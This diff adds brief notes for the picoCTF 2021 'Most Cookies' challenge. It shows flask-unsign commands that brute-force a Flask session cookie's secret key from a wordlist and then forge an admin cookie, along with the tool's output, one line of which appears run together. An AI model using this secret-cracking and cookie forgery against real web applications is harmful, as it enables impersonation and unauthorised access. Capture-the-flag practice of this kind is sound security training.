@@ -1,0 +1,10 @@
+article: https://medium.com/private-user-hq/picoctf-2021-most-cookies-7f3d8b6cd0b
+
+$ pip install flask-unsign[wordlist]
+$ flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YGHZvg.hvmOT3C_J1RVk3yrj7zA9Dxo8lA --wordlist wordlist.txt
+[*] Session decodes to: {'very_auth': 'blank'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 28 attemptscadamia
+'wafer'
+$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret wafer
+eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YGHbOQ.4iogbBnCbe4C3zanPAtBnYj9CUg
